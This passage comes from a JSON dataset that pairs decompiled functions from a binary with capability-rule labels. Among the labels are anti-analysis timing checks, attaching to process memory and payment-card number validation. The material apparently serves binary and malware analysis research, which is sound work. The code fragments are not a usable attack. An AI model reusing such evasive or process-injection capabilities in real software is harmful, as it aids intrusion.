        "decompiled_code": "\nvoid fcn.00052cd4(ulong arg1, ulong arg2, uint *arg3)\n\n{\n    char cVar1;\n    uchar extraout_AL;\n    uchar extraout_AL_00;\n    uchar uVar2;\n    uchar extraout_AH;\n    uchar extraout_AH_00;\n    uchar extraout_AH_01;\n    ushort extraout_var;\n    ushort extraout_var_00;\n    uint extraout_var_01;\n    \n    cVar1 = fcn.00052258(arg1, arg2);\n    *(arg3 + 1) = cVar1;\n    *arg3 = 0x8f;\n    if (cVar1 == '\\b') {\n        uVar2 = fcn.0005247c(arg1);\n        *(arg3 + 2) = uVar2;\n    }\n    else if (cVar1 == '\\x10') {\n        uVar2 = fcn.0005250c(arg1);\n        *(arg3 + 2) = CONCAT11(extraout_AH_01, uVar2);\n    }\n    else if (cVar1 == ' ') {\n        fcn.00052538(arg1);\n        arg3[2] = CONCAT22(extraout_var_00, CONCAT11(extraout_AH_00, extraout_AL_00));\n    }\n    else if (cVar1 == '@') {\n        fcn.00052588(arg1);\n        *(arg3 + 2) = CONCAT44(extraout_var_01, CONCAT22(extraout_var, CONCAT11(extraout_AH, extraout_AL)));\n    }\n    return;\n}\n",
        "token_count": 346
    },
    "000531b8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.000531b8(int64_t arg1, ulong arg2, uint *arg3)\n\n{\n    char cVar1;\n    uchar extraout_AL;\n    uchar extraout_AL_00;\n    uchar uVar2;\n    uchar extraout_AH;\n    uchar extraout_AH_00;\n    uchar extraout_AH_01;\n    ushort extraout_var;\n    ushort extraout_var_00;\n    uint extraout_var_01;\n    \n    cVar1 = *(arg1 + 0x134);\n    if (cVar1 == '\\x10') {\n        *(arg3 + 6) = 0x10;\n        uVar2 = fcn.0005250c(arg1);\n        *(arg3 + 2) = CONCAT11(extraout_AH_01, uVar2);\n    }\n    else if (cVar1 == ' ') {\n        *(arg3 + 6) = 0x20;\n        fcn.00052538(arg1);\n        arg3[2] = CONCAT22(extraout_var_00, CONCAT11(extraout_AH_00, extraout_AL_00));\n    }\n    else {\n        if (cVar1 != '@') {\n            return;\n        }\n        *(arg3 + 6) = 0x40;\n        fcn.00052588(arg1);\n        *(arg3 + 2) = CONCAT44(extraout_var_01, CONCAT22(extraout_var, CONCAT11(extraout_AH, extraout_AL)));\n    }\n    *arg3 = 0x8d;\n    uVar2 = fcn.00052258(arg1, arg2);\n    *(arg3 + 1) = uVar2;\n    return;\n}\n",
        "token_count": 368
    },
    "00054190": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "attach user process memory",
            "find process by PID"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.00054190(ulong *arg1, int64_t *arg2)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    int64_t arg1_00;\n    uint32_t *puVar5;\n    uint64_t uVar6;\n    bool bVar7;\n    uint32_t *puStackX8;\n    ulong uStackX16;\n    ulong auStackX24 [2];\n    uchar auStack376 [48];\n    int16_t aiStack328 [4];\n    int64_t iStack320;\n    \n    puStackX8._0_4_ = *0x8d334;\n    puStackX8 = NULL;\n    bVar7 = *0x8d334 == 0xffffffff;\n    *arg1 = 0;\n    *arg2 = 0;\n    if (bVar7) {\n        uVar4 = 0x21590005;\n    }\n    else {\n        if (puStackX8 == 0) {\n            *0x8d334 = 0xffffffff;\n            uVar4 = fcn.00030564(0x10, &puStackX8);\n            iVar2 = uVar4;\n            if (iVar2 == 0) {\n                uVar6 = 0;\n                uVar4 = 0x21590005;\n                puVar1 = puStackX8 + 2;\n                puVar5 = puVar1;\n                if (*puStackX8 != 0) {\n                    do {\n                        iVar2 = (*_fcn.00011410)(*puVar5, &uStackX16);\n                        if (iVar2 == 0) {\n                            (**0x113d8)(uStackX16, auStack376);\n                            iVar2 = fcn.00066920(*(puVar5 + 6), 1, aiStack328, 0x104, 0);\n                            (*_fcn.000113d0)(auStack376);\n                            if ((((iVar2 == 0) && (iStack320 != 0)) && (aiStack328[0] == 0x20)) &&\n                               (iVar2 = fcn.000666ec(iStack320, 0x15e80, 0x20),  iVar2 == 0)) {\n                                puStackX8._0_4_ = puVar1[uVar6 * 6];\n                                *0x8d334 = puStackX8;\n                                (*_fcn.000115b8)(uStackX16);\n                                uVar4 = 0;\n                                goto code_r0x000542d8;\n                            }\n                            (*_fcn.000115b8)();\n                        }\n                        uVar3 = uVar6 + 1;\n                        uVar6 = uVar3;\n                        puVar5 = puVar5 + 6;\n                    } while (uVar3 < *puStackX8);\n                }\ncode_r0x000542d8:\n                fcn.00030d24(puStackX8);\n                iVar2 = uVar4;\n            }\n            else {\n            }\n            if (iVar2 != 0) {\n                return uVar4;\n            }\n        }\n        arg1_00 = fcn.00030cc4(0x30);\n        if (arg1_00 == 0) {\n            uVar4 = 0x21590004;\n        }\n        else {\n            uVar3 = (*_fcn.00011410)(puStackX8, auStackX24);\n            uVar4 = uVar3;\n            if (uVar3 == 0) {\n                (**0x113d8)(auStackX24[0], arg1_00);\n                *arg1 = auStackX24[0];\n                *arg2 = arg1_00;\n            }\n            else {\n                fcn.00030d24(arg1_00);\n                uVar4 = fcn.00066782(uVar4);\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 886
    },
    "00054670": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.00054670(int64_t *arg1, uint64_t arg2)\n\n{\n    int64_t arg1_00;\n    int64_t iVar1;\n    \n    arg1_00 = *arg1;\n    if (arg2 < 0x20) {\n        *arg1 = arg1 + 0x8f;\n    }\n    else {\n        iVar1 = fcn.00030cc4(arg2);\n        *arg1 = iVar1;\n        if (iVar1 == 0) {\n            return 0x21590004;\n        }\n    }\n    if (arg1_00 != 0) {\n        if (arg1_00 != *arg1) {\n            fcn.0006670a(*arg1, arg1_00, arg1[6]);\n        }\n        if (arg1_00 != arg1 + 0x8f) {\n            fcn.00030d24(arg1_00);\n        }\n    }\n    arg1[6] = arg2;\n    return 0;\n}\n",
        "token_count": 225
    },
    "00057230": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00057230(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t *piVar4;\n    int64_t **arg2;\n    uint64_t uVar5;\n    uint64_t *puVar6;\n    int64_t **arg1;\n    uint32_t uVar7;\n    int64_t **ppiVar9;\n    char *pcVar10;\n    int64_t iVar11;\n    int64_t **ppiVar12;\n    int64_t **arg1_00;\n    bool bVar13;\n    char acStack88 [24];\n    int64_t **ppiVar8;\n    \n    arg1_00 = NULL;\n    if (*0x8e040 == 0) {\n        return;\n    }\n    LOCK();\n    bVar13 = *0x8d390 == 0;\n    *0x8d390 = *0x8d390 ^ bVar13 * (*0x8d390 ^ 1);\n    if (!bVar13) {\n        return;\n    }\n    iVar2 = fcn.0001a1ec();\n    if (((iVar2 != 0) && (iVar3 = fcn.0003205c(acStack88, 0x10),  iVar3 != 0)) &&\n       (iVar3 = fcn.00030334(0x8d370),  iVar3 != 0)) {\n        ppiVar9 = 0x8d3d0;\n        arg2 = arg1_00;\n        ppiVar8 = arg1_00;\ncode_r0x000572b5:\n        uVar7 = ppiVar8;\n        if ((*(ppiVar9 + -0xf) != '\\0') && (*(ppiVar9 + -2) != '\\0')) {\n            uVar5 = 0xffffffffffffffff;\n            pcVar10 = acStack88;\n            do {\n                if (uVar5 == 0) break;\n                uVar5 = uVar5 - 1;\n                cVar1 = *pcVar10;\n                pcVar10 = pcVar10 + 1;\n            } while (cVar1 != '\\0');\n            iVar11 = ppiVar9[-7] + -1;\n            if (iVar11 != 0) {\n                do {\n                    iVar11 = iVar11 + 1;\n                    cVar1 = *((~uVar5 - 1) + iVar11);\n                    if (((cVar1 == ',') || (cVar1 == '\\0')) &&\n                       (iVar3 = fcn.00066812(acStack88, iVar11, ~uVar5 - 1 & 0xffffffff),  iVar3 == 0)) break;\n                    iVar11 = fcn.0006682a();\n                } while (iVar11 != 0);\n                if (iVar11 != 0) {\n                    arg2 = *ppiVar9;\n                    ppiVar12 = NULL;\n                    if (*ppiVar9 != NULL) {\n                        do {\n                            arg1 = arg2;\n                            if ((*(arg1 + 0x1c) != 0) && (iVar3 = fcn.000325fc(0x8d378, 1),  iVar3 != 0)) {\n                                if (ppiVar12 == NULL) {\n                                    *(ppiVar8 * 0x40 + 0x8d3d0) = *arg1;\n                                }\n                                else {\n                                    *ppiVar12 = *arg1;\n                                }\n                                fcn.000325d8(0x8d378, 1);\n                                fcn.00030d24(arg1);\n                                fcn.00030378(0x8d370);\n                                goto code_r0x000574c1;\n                            }\n                            arg2 = arg1;\n                        } while ((*(arg1 + 2) != iVar2) && (arg2 = *arg1,  ppiVar12 = arg1,  arg2 != NULL));\n                        if (arg2 != NULL) {\n                            if (((arg2[4] == NULL) && (*(arg2 + 0x14) == 0)) && (*(arg2 + 3) == 0)) {\n                                piVar4 = fcn.00031204(0);\n                                if (piVar4 < arg2[1]) {\n                                    arg2[1] = piVar4;\n                                }\n                                if (piVar4 - arg2[1] < 0x14) goto code_r0x0005746c;\n                                if (*(ppiVar9 + -0xe) != '\\0') {\n                                    puVar6 = ppiVar8 * 0x40 + 0x8d3c8;\n                                    LOCK();\n                                    uVar5 = *puVar6;\n                                    *puVar6 = *puVar6 ^ (uVar5 == 0) * *puVar6;\n                                    if (0 < (uVar5 != 0) * *puVar6) goto code_r0x0005746c;\n                                }\n                                if ((ppiVar9[-3] == NULL) || (iVar3 = fcn.00056ad8(ppiVar9[-3]),  iVar3 != 0)) {\n                                    LOCK();\n                                    piVar4 = ppiVar8 * 0x40 + 0x8d3c8;\n                                    *piVar4 = *piVar4 + 1;\n                                    fcn.000324dc(0x8d378, 0);\n                                    arg1_00 = ppiVar8 * 0x40 + 0x8d398;\n                                    *(arg2 + 0x14) = 1;\n                                    goto code_r0x00057483;\n                                }\n                            }\n                            goto code_r0x0005746c;\n                        }\n                    }\n                    arg2 = fcn.00030cc4(0x38);\n                    if (arg2 == NULL) goto code_r0x00057483;\n                    *arg2 = *ppiVar9;\n                    *ppiVar9 = arg2;\n                    *(arg2 + 2) = iVar2;\n                    arg2[4] = NULL;\n                    piVar4 = fcn.00031204(0);\n                    *(arg2 + 0x14) = 0;\n                    *(arg2 + 3) = 0;\n                    *(arg2 + 0x1c) = 0;\n                    arg2[1] = piVar4;\n                    arg2[5] = NULL;\n                    arg2[6] = NULL;\n                }\n            }\n        }\ncode_r0x0005746c:\n        uVar7 = uVar7 + 1;\n        ppiVar8 = uVar7;\n        ppiVar9 = ppiVar9 + 8;\n        if (0x31 < uVar7) goto code_r0x00057483;\n        goto code_r0x000572b5;\n    }\ncode_r0x000574c1:\n    LOCK();\n    *0x8d390 = *0x8d390 - 1;\n    return;\ncode_r0x00057483:\n    fcn.00030378(0x8d370);\n    if (((uVar7 < 0x32) && (arg2 != NULL)) && (iVar2 = fcn.00056b24(arg1_00, arg2, 0x56e50, 0),  iVar2 != 0)) {\n        *(arg2 + 0x14) = 0;\n        fcn.000325d8(0x8d378, 0);\n    }\n    goto code_r0x000574c1;\n}\n",
        "token_count": 1641
    },
    "00058ebc": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00058ebc(int64_t arg1, ulong *arg2, int64_t arg3)\n\n{\n    ulong arg2_00;\n    int32_t iVar1;\n    uint uVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    ulong *puVar4;\n    uint64_t uVar5;\n    uchar auStack152 [16];\n    uint uStack136;\n    ushort uStack132;\n    ushort uStack130;\n    ushort uStack128;\n    uint uStack126;\n    ulong uStack122;\n    uchar auStack112 [32];\n    uint uStack80;\n    uint *puStack72;\n    \n    arg2_00 = *(*(arg1 + 0x18) + 8);\n    iVar1 = 0;\n    uVar5 = 0;\n    arg1_00 = (**0x114d8)(3, arg2_00, 0, 0, 0, 0, 1, 0, 0);\n    puVar4 = arg2;\n    if (arg1_00 == 0) {\n        uVar2 = 0x21590004;\n    }\n    else {\n        for (; puVar4 != NULL; puVar4 = *puVar4) {\n            if (*(puVar4 + 2) != 0) {\n                iVar3 = (**0x11140)(puVar4[1], *(puVar4 + 2), uVar5 & 0xffffffffffffff00 | puVar4 != arg2, 0, arg1_00);\n                if (iVar3 == 0) {\n                    (**0x11590)(arg1_00, 0);\n                    return 0x21590004;\n                }\n                uVar5 = 0;\n                (**0x11138)(iVar3);\n                iVar1 = iVar1 + *(puVar4 + 2);\n            }\n        }\n        uStack136 = 1;\n        uStack132 = 0xe;\n        uStack130 = 2;\n        uStack126 = *(arg3 + 4);\n        uStack128 = *(arg3 + 2);\n        uStack122 = 0;\n        fcn.0006677c(auStack112, 0, 0x30);\n        puStack72 = &uStack136;\n        uStack80 = 0x16;\n        iVar3 = *(arg1_00 + 0xb8);\n        *(iVar3 + -0x10) = 0;\n        *(iVar3 + -8) = 0;\n        *(iVar3 + -0x45) = 0;\n        iVar3 = *(arg1_00 + 0xb8);\n        *(iVar3 + -0x48) = 0xf;\n        *(iVar3 + -0x47) = 9;\n        *(iVar3 + -0x20) = arg2_00;\n        *(iVar3 + -0x18) = *(arg1 + 0x18);\n        *(iVar3 + -0x40) = iVar1;\n        *(iVar3 + -0x38) = auStack112;\n        iVar1 = fcn.0006558c(arg1_00, arg2_00, auStack152, 0xffffffff);\n        uVar2 = fcn.00066782(iVar1);\n        if (iVar1 == -0x3ffffdfa) {\n            uVar2 = 0x2159000b;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 757
    },
    "0005a0bc": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint64_t fcn.0005a0bc(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    \n    iVar1 = 0;\n    fcn.00032174(arg1 + 0x38);\n    piVar2 = *(arg1 + 0x30);\n    if (piVar2 != NULL) {\n        do {\n            if (*(piVar2 + 1) == arg2) break;\n            piVar2 = *piVar2;\n        } while (piVar2 != NULL);\n        if (piVar2 != NULL) {\n            iVar1 = piVar2[2];\n        }\n    }\n    fcn.000321f4(arg1 + 0x38);\n    return iVar1;\n}\n",
        "token_count": 171
    },
    "0005a95c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0005a95c(int64_t arg1)\n\n{\n    ulong *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (0 < *(arg1 + 0x110)) {\n        puVar1 = arg1 + 0x28;\n        do {\n            fcn.00030d24(*puVar1);\n            iVar2 = iVar2 + 1;\n            puVar1 = puVar1 + 3;\n        } while (iVar2 < *(arg1 + 0x110));\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "0005a994": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0005a994(int64_t arg1, ulong arg2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    ulong uStack72;\n    uint uStack64;\n    ulong uStack56;\n    ulong *puStack48;\n    ulong uStack40;\n    \n    if (*(*(*(arg1 + 8) + 0x20) + 0x48) == 0) {\n        if (*(arg1 + 0x10) == 0) {\n            iVar3 = 0x21590001;\n        }\n        else if (*(arg1 + 0x18) == 0) {\n            uStack72._0_4_ = *(arg1 + 0x14);\n            uStack72._4_4_ = 0;\n            uStack64 = 3;\n            uVar1 = fcn.00030dc8(uStack72);\n            uStack72 = CONCAT44(uStack72._4_4_, uVar1);\n            uVar2 = fcn.00030dc8(uStack72._4_4_);\n            uStack72 = uStack72 & 0xffffffff | uVar2 << 0x20;\n            puStack48 = &uStack72;\n            uStack40 = 0xc;\n            uStack56 = arg2;\n            iVar3 = fcn.00064248(*(*(arg1 + 8) + 0x18), &uStack56, 0);\n            if (iVar3 == 0x21590003) {\n                iVar3 = 0x21590006;\n            }\n        }\n        else {\n            iVar3 = *(arg1 + 0x1c);\n        }\n    }\n    else {\n        iVar3 = 0x21590006;\n    }\n    return iVar3;\n}\n",
        "token_count": 407
    },
    "0005e4c8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0005e4c8(int64_t arg1, int64_t **arg2, char **arg3, int32_t *arg4)\n\n{\n    uint *puVar1;\n    int64_t **ppiVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uchar auStackX16 [24];\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uchar auStack216 [152];\n    \n    iVar6 = 0;\n    ppiVar2 = arg2;\n    if (arg2 != NULL) {\n        do {\n            iVar6 = iVar6 + *(ppiVar2 + 2);\n            ppiVar2 = *ppiVar2;\n        } while (ppiVar2 != NULL);\n        if (iVar6 != 0) {\n            puVar1 = *(arg1 + 0x28);\n            uStack240 = *puVar1;\n            uStack236 = puVar1[1];\n            uStack232 = puVar1[2];\n            uStack228 = puVar1[3];\n            fcn.0002d030(auStack216, 0x10, &uStack240);\n            pcVar3 = fcn.00030c98(iVar6 + 9);\n            if (pcVar3 != NULL) {\n                uVar7 = 0;\n                iVar5 = 1;\n                iVar9 = 0;\n                do {\n                    do {\n                        if (8 - uVar7 < *(arg2 + 2) - iVar9) {\n                            fcn.0006670a(auStackX16 + uVar7, iVar9 + arg2[1]);\n                            iVar8 = 8 - uVar7;\n                            uVar7 = 8;\n                            iVar9 = iVar9 + iVar8;\n                        }\n                        else {\n                            fcn.0006670a(auStackX16 + uVar7, iVar9 + arg2[1]);\n                            ppiVar2 = arg2 + 2;\n                            arg2 = *arg2;\n                            uVar7 = uVar7 + (*ppiVar2 - iVar9);\n                            iVar9 = 0;\n                        }\n                    } while ((uVar7 != 8) && (arg2 != NULL));\n                    fcn.0002ca20(auStackX16, pcVar3 + iVar5, uVar7, auStack216);\n                    for (; uVar4 = uVar7 >> 0x1f & 7,  (uVar7 + uVar4 & 7) != uVar4; uVar7 = uVar7 + 1) {\n                    }\n                    iVar5 = iVar5 + uVar7;\n                    uVar7 = 0;\n                } while (arg2 != NULL);\n                *pcVar3 = (iVar5 + -1) - iVar6;\n                *arg3 = pcVar3;\n                *arg4 = iVar5;\n                return 0;\n            }\n            return 0x21590004;\n        }\n    }\n    *arg3 = NULL;\n    *arg4 = 0;\n    return 0;\n}\n",
        "token_count": 712
    },
    "0005f12c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0005f12c(int64_t arg1, int64_t arg2, ulong arg3, ulong *arg4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    ulong *puVar3;\n    ulong *puVar4;\n    ulong *puVar5;\n    int32_t *in_stack_00000028;\n    \n    puVar3 = NULL;\n    if (arg3 == 0) {\n        puVar3 = fcn.00030c98(0x18);\n        if (puVar3 == NULL) {\n            puVar3 = *arg4;\n            while (puVar3 != NULL) {\n                puVar5 = *puVar3;\n                fcn.00030d24(puVar3);\n                puVar3 = puVar5;\n            }\n            *arg4 = 0;\n            return 0x21590004;\n        }\n        *puVar3 = 0;\n        puVar3[1] = 0;\n        puVar3[2] = 0;\n        *arg4 = puVar3;\n        *in_stack_00000028 = 1;\n    }\n    else {\n        *arg4 = 0;\n        *in_stack_00000028 = 0;\n        puVar5 = puVar3;\n        if (0 < arg3) {\n            do {\n                iVar2 = *(arg1 + 0x14);\n                if (iVar2 == *(arg1 + 0x18)) {\n                    if (0x3ff < iVar2 - *(arg1 + 0x18)) {\n                        iVar2 = fcn.000667b8();\n                        iVar2 = *(arg1 + 0x14) - iVar2 % 0x401;\n                    }\n                }\n                else {\n                    iVar2 = *(arg1 + 0x18);\n                    iVar1 = fcn.000667b8();\n                    iVar2 = iVar2 + iVar1 % ((*(arg1 + 0x14) - iVar2) + 1);\n                }\n                iVar1 = puVar3;\n                if (arg3 - iVar1 < iVar2) {\n                    iVar2 = arg3 - iVar1;\n                }\n                puVar4 = fcn.00030c98(0x18);\n                if (puVar4 == NULL) {\n                    puVar3 = *arg4;\n                    while (puVar3 != NULL) {\n                        puVar5 = *puVar3;\n                        fcn.00030d24(puVar3);\n                        puVar3 = puVar5;\n                    }\n                    *arg4 = 0;\n                    return 0x21590004;\n                }\n                *puVar4 = 0;\n                puVar4[2] = 0;\n                *(puVar4 + 2) = iVar2;\n                puVar4[1] = iVar1 + arg2;\n                if (puVar5 == NULL) {\n                    *arg4 = puVar4;\n                }\n                else {\n                    *puVar5 = puVar4;\n                }\n                *in_stack_00000028 = *in_stack_00000028 + 1;\n                puVar3 = iVar1 + iVar2;\n                puVar5 = puVar4;\n            } while (iVar1 + iVar2 < arg3);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 718
    },
    "00062298": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.00062298(int64_t *arg1, int64_t *arg2, int64_t **arg3, uint *arg4)\n\n{\n    int64_t *arg1_00;\n    int64_t *piVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uchar uVar5;\n    ulong uVar6;\n    \n    uVar6 = 0;\n    if (((arg3 == NULL) || (arg2 == NULL)) || (arg4 == NULL)) {\n        uVar6 = 0x21590064;\n    }\n    else {\n        uVar5 = (**0x113f0)(arg3 + 4);\n        arg1_00 = *arg3;\n        if (arg1_00 == NULL) {\n            uVar6 = 0xffffffff;\n        }\n        else {\n            *arg1 = arg1_00[1];\n            *arg2 = arg1_00[2];\n            uVar2 = *(arg1_00 + 0x1c);\n            uVar3 = *(arg1_00 + 4);\n            uVar4 = *(arg1_00 + 0x24);\n            *arg4 = *(arg1_00 + 3);\n            arg4[1] = uVar2;\n            arg4[2] = uVar3;\n            arg4[3] = uVar4;\n            piVar1 = *arg1_00;\n            *arg3 = piVar1;\n            if (piVar1 == NULL) {\n                arg3[1] = NULL;\n            }\n            arg3[2] = arg3[2] - arg1_00[2];\n            fcn.00030d24(arg1_00);\n        }\n        (**0x113e8)(arg3 + 4, uVar5);\n    }\n    return uVar6;\n}\n",
        "token_count": 407
    },
    "00062644": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.00062644(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    fcn.00030310(0x8e2a0);\n    iVar2 = fcn.0005cf30(arg1, 1);\n    uVar3 = 0;\n    if (iVar2 == 0) {\n        uVar3 = 0x21590065;\n    }\n    else if (*(*arg1 + 8) == 0) {\n        LOCK();\n        piVar1 = *arg1 + 0x10;\n        *piVar1 = *piVar1 + 1;\n    }\n    else {\n        uVar3 = 0x21590006;\n    }\n    fcn.00030378(0x8e2a0);\n    return uVar3;\n}\n",
        "token_count": 193
    },
    "00062ff4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.00062ff4(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    fcn.00030310(0x8e2b0);\n    iVar2 = fcn.0005cf30(arg1, 4);\n    uVar3 = 0;\n    if (iVar2 == 0) {\n        uVar3 = 0x21590065;\n    }\n    else if (*(*arg1 + 8) == 0) {\n        LOCK();\n        piVar1 = *arg1 + 0x10;\n        *piVar1 = *piVar1 + 1;\n    }\n    else {\n        uVar3 = 0x21590006;\n    }\n    fcn.00030378(0x8e2b0);\n    return uVar3;\n}\n",
        "token_count": 194
    },
    "00063870": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.00063870(int64_t arg1)\n\n{\n    char cVar1;\n    char cVar2;\n    char **ppcVar3;\n    ulong *puVar4;\n    char *pcVar5;\n    int64_t iVar6;\n    \n    puVar4 = 0x7da88;\n    do {\n        for (ppcVar3 = *puVar4; (ppcVar3 != NULL && (pcVar5 = *ppcVar3,  pcVar5 != NULL)); ppcVar3 = ppcVar3 + 0x14) {\n            iVar6 = arg1 - pcVar5;\n            do {\n                cVar1 = *pcVar5;\n                cVar2 = pcVar5[iVar6];\n                if (cVar1 != cVar2) break;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            if ((cVar1 == cVar2) && (*(ppcVar3 + 1) == 1)) {\n                return *(ppcVar3 + 0xc);\n            }\n        }\n        puVar4 = puVar4 + -2;\n        if (puVar4 < 0x7d9f8) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 283
    },
    "00063c38": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.00063c38(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    fcn.00030310(0x8e2d8);\n    iVar2 = fcn.0005cf30(arg1, 2);\n    uVar3 = 0;\n    if (iVar2 == 0) {\n        uVar3 = 0x21590065;\n    }\n    else if (*(*arg1 + 8) == 0) {\n        LOCK();\n        piVar1 = *arg1 + 0x10;\n        *piVar1 = *piVar1 + 1;\n    }\n    else {\n        uVar3 = 0x21590006;\n    }\n    fcn.00030378(0x8e2d8);\n    return uVar3;\n}\n",
        "token_count": 194
    },
    "000645e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.000645e0(int64_t *arg1)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    \n    if ((*(*arg1 + 0x20) < 0x51) || (pcVar1 = *(*arg1 + 0x50),  pcVar1 == NULL)) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 108
    },
    "00064610": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.00064610(int64_t *arg1)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    \n    if ((*(*arg1 + 0x20) < 0x59) || (pcVar1 = *(*arg1 + 0x58),  pcVar1 == NULL)) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 107
    },
    "00064640": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.00064640(int64_t *arg1)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    \n    if ((*(*arg1 + 0x20) < 0x61) || (pcVar1 = *(*arg1 + 0x60),  pcVar1 == NULL)) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 107
    },
    "00064a60": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.00064a60(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    fcn.00030310(0x8e2e8);\n    iVar2 = fcn.0005cf30(arg1, 3);\n    uVar3 = 0;\n    if (iVar2 == 0) {\n        uVar3 = 0x21590065;\n    }\n    else if (*(*arg1 + 8) == 0) {\n        LOCK();\n        piVar1 = *arg1 + 0x10;\n        *piVar1 = *piVar1 + 1;\n    }\n    else {\n        uVar3 = 0x21590006;\n    }\n    fcn.00030378(0x8e2e8);\n    return uVar3;\n}\n",
        "token_count": 194
    },
    "00066020": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.00066020(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    ulong uStack88;\n    ulong uStack80;\n    uint uStack72;\n    uint uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    uint uStack40;\n    uint uStack32;\n    \n    if ((*0x8e368 == 0) || (*0x8e370 == 0)) {\n        uVar2 = 0;\n    }\n    else {\n        uStack88 = *0x7dae8;\n        uStack80 = *0x7daf0;\n        uStack72 = *0x7daf8;\n        uStack32 = 0;\n        uStack64 = arg1;\n        uStack56 = arg2;\n        uStack48 = arg3;\n        uStack40 = arg4;\n        iVar1 = (**(*0x8e368 + 0x38))(*0x8e370, &uStack88);\n        uVar2 = 0;\n        if (iVar1 == 0x2159020a) {\n            uVar2 = uStack32;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 273
    },
    "000660a4": {
        "rules": [
